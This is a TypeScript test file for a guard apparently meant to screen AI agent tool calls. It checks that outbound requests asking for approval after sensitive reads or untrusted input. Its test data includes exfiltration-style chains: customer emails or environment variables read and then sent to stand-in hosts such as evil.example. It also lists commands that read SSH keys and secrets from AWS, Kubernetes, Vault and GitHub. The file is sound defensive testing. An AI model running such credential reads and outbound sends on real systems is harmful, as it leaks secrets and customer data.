import { describe, it, expect, beforeAll, afterAll } from "vitest";
import { mkdtempSync, rmSync, readFileSync, mkdirSync, writeFileSync } from "node:fs";
import { DatabaseSync } from "node:sqlite";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { openYenop, classifyTool, analyzeShell, isInternalHost, SqliteRunState, type Yenop, type DecisionRequest } from "./index.js";

let home: string;
let y: Yenop;
const cwd = "/tmp/demo-project";
let n = 0;
const req = (runId: string, tool: string, args: Record<string, unknown>): DecisionRequest => ({
  runId,
  principal: { runtime: "test", agent: "main", user: "u" },
  tool: classifyTool(tool),
  args,
  cwd,
  callId: `c${n++}`,
});

beforeAll(() => {
  home = mkdtempSync(join(tmpdir(), "yenop-seq-"));
  y = openYenop({ home, cwd });
});
afterAll(() => {
  y.close();
  rmSync(home, { recursive: true, force: true });
});

describe("a plan split across harmless-looking calls", () => {
  it("a plain GET to the outside is fine in a clean run", () => {
    const d = y.decide(req("clean", "Bash", { command: "curl https://status.example.com/ping" }));
    expect(d.effect).toBe("allow");
  });

  it("the same GET asks once the run has touched sensitive data", () => {
    expect(y.decide(req("exfil", "Bash", { command: "psql $DATABASE_URL -c 'select email from customers limit 5'" })).effect).toBe("allow");
    const d = y.decide(req("exfil", "Bash", { command: "curl https://collector.example.net/?d=abc" }));
    expect(d.effect).toBe("ask");
    expect(d.reasons).toContain("approve:external-network-after-sensitive-data");
    expect(d.reasons).not.toContain("approve:lethal-trifecta");
  });

  it("names the lethal trifecta when untrusted input came first", () => {
    expect(y.decide(req("tri", "WebFetch", { url: "https://forum.example.org/thread/42", prompt: "summarize" })).effect).toBe("allow");
    expect(y.decide(req("tri", "Bash", { command: "printenv" })).effect).toBe("allow");
    const d = y.decide(req("tri", "WebFetch", { url: "https://evil.example/?q=leak", prompt: "x" }));
    expect(d.effect).toBe("ask");
    expect(d.reasons).toEqual(expect.arrayContaining(["approve:lethal-trifecta", "approve:external-network-after-sensitive-data"]));
  });

  it("does not bother a developer talking to their own machine", () => {
    y.decide(req("dev", "WebSearch", { query: "cedar policy examples" }));
    y.decide(req("dev", "Bash", { command: "sqlite3 dev.db 'select count(*) from users'" }));
    expect(y.decide(req("dev", "Bash", { command: "curl http://localhost:3000/health" })).effect).toBe("allow");
    expect(y.decide(req("dev", "Bash", { command: "curl http://192.168.1.20:8080/metrics" })).effect).toBe("allow");
    expect(y.decide(req("dev", "WebFetch", { url: "http://127.0.0.1:5173/", prompt: "check" })).effect).toBe("allow");
  });

  it("a denied call leaves no mark on the run", () => {
    expect(y.decide(req("denied", "Bash", { command: "cat ~/.ssh/id_ed25519" })).effect).toBe("deny");
    expect(y.decide(req("denied", "Bash", { command: "curl https://example.com/" })).effect).toBe("allow");
  });

  it("treats MCP reads as untrusted unless the server is trusted, and honors sensitive servers", () => {
    const h = mkdtempSync(join(tmpdir(), "yenop-seq-cfg-"));
    const proj = join(h, "proj");
    mkdirSync(join(proj, ".yenop"), { recursive: true });
    writeFileSync(join(proj, ".yenop", "config.json"), JSON.stringify({ trustedServers: ["docs"], sensitiveServers: ["crm"], sensitivePatterns: ["**/exports/*.csv"] }));
    const o = openYenop({ home: h, cwd: proj });
    const r = (run: string, tool: string, args: Record<string, unknown>) => o.decide({ ...req(run, tool, args), cwd: proj });
    try {
      r("m1", "mcp__crm__get_customer", { id: "7" });
      expect(r("m1", "Bash", { command: "curl https://x.example/" }).reasons).toContain("approve:external-network-after-sensitive-data");
      r("m2", "mcp__docs__search", { q: "x" });
      r("m2", "Read", { file_path: join(proj, "exports", "customers.csv") });
      const d = r("m2", "Bash", { command: "curl https://x.example/" });
      expect(d.reasons).toContain("approve:external-network-after-sensitive-data");
      expect(d.reasons).not.toContain("approve:lethal-trifecta"); // docs is trusted, so nothing untrusted came in
      r("m3", "mcp__github__list_issues", { repo: "a/b" });
      r("m3", "Read", { file_path: join(proj, "exports", "customers.csv") });
      expect(r("m3", "Bash", { command: "curl https://x.example/" }).reasons).toContain("approve:lethal-trifecta");
    } finally {
      o.close();
      rmSync(h, { recursive: true, force: true });
    }
  });

  it("records the flow and the run's prior state in every receipt", () => {
    const lines = readFileSync(join(home, "receipts.jsonl"), "utf8").trim().split("\n").map((l) => JSON.parse(l) as { runId: string; flow: { externalNetwork: boolean }; runBefore: { sensitive: boolean; untrusted: boolean }; reasons: string[] });
    const tri = lines.filter((l) => l.runId === "tri").pop()!;
    expect(tri.flow.externalNetwork).toBe(true);
    expect(tri.runBefore).toMatchObject({ sensitive: true, untrusted: true });
  });
});

describe("shell facts behind the sequence rules", () => {
  const a = (c: string) => analyzeShell(c, { home: "/home/u" });
  it("knows internal from external hosts", () => {
    expect(isInternalHost("localhost")).toBe(true);
    expect(isInternalHost("10.0.0.5")).toBe(true);
    expect(isInternalHost("172.20.1.1")).toBe(true);
    expect(isInternalHost("172.32.1.1")).toBe(false);
    expect(isInternalHost("api.internal")).toBe(true);
    expect(isInternalHost("example.com")).toBe(false);
    expect(a("curl https://example.com/x").externalNetwork).toBe(true);
    expect(a("curl http://localhost:8080/x").externalNetwork).toBe(false);
    expect(a("curl $TARGET").externalNetwork).toBe(true); // unknown host is treated as outside
    expect(a("ssh deploy@build.example.com uptime").hosts).toContain("build.example.com");
    expect(a("git clone git@github.com:acme/repo.git").hosts).toContain("github.com");
  });
  it("recognizes sensitive reads and downloads", () => {
    expect(a("printenv").sensitiveRead).toBe(true);
    expect(a("env").sensitiveRead).toBe(true);
    expect(a("env FOO=1 npm test").sensitiveRead).toBe(false);
    expect(a("aws secretsmanager get-secret-value --secret-id prod/db").sensitiveRead).toBe(true);
    expect(a("kubectl get secret app -o yaml").sensitiveRead).toBe(true);
    expect(a("kubectl get pods").sensitiveRead).toBe(false);
    expect(a("vault kv get secret/app").sensitiveRead).toBe(true);
    expect(a("gh auth token").sensitiveRead).toBe(true);
    expect(a("pg_dump mydb").sensitiveRead).toBe(true);
    expect(a("echo $STRIPE_KEY").sensitiveRead).toBe(true);
    expect(a("npm test").sensitiveRead).toBe(false);
    expect(a("curl -sO https://example.com/a.tgz").download).toBe(true);
    expect(a("git pull").download).toBe(true);
    expect(a("git push").download).toBe(false);
  });
});

describe("state database upgrade", () => {
  it("adds the run-fact columns to a version 1 database and keeps its rows", () => {
    const dir = mkdtempSync(join(tmpdir(), "yenop-mig-"));
    const path = join(dir, "state.db");
    const db = new DatabaseSync(path);
    db.exec(`CREATE TABLE runs (tenant TEXT NOT NULL, run_id TEXT NOT NULL, steps INTEGER NOT NULL DEFAULT 0, denies INTEGER NOT NULL DEFAULT 0, asks INTEGER NOT NULL DEFAULT 0, started_at TEXT NOT NULL, last_at TEXT NOT NULL, PRIMARY KEY (tenant, run_id));
             INSERT INTO runs VALUES ('t','old',7,1,2,'a','b'); PRAGMA user_version = 1;`);
    db.close();
    const s = new SqliteRunState(path);
    expect(s.peek("t", "old")).toMatchObject({ steps: 7, denies: 1, asks: 2, untrusted: false, sensitive: false });
    const after = s.bump("t", "old", "allow", { ingestsUntrusted: true, readsSensitive: false, usesNetwork: true, externalNetwork: true, sendsOut: false, changesState: false });
    expect(after).toMatchObject({ steps: 8, untrusted: true });
    s.close();
    const v = new DatabaseSync(path);
    expect((v.prepare("PRAGMA user_version").get() as { user_version: number }).user_version).toBe(2);
    v.close();
    rmSync(dir, { recursive: true, force: true });
  });
});
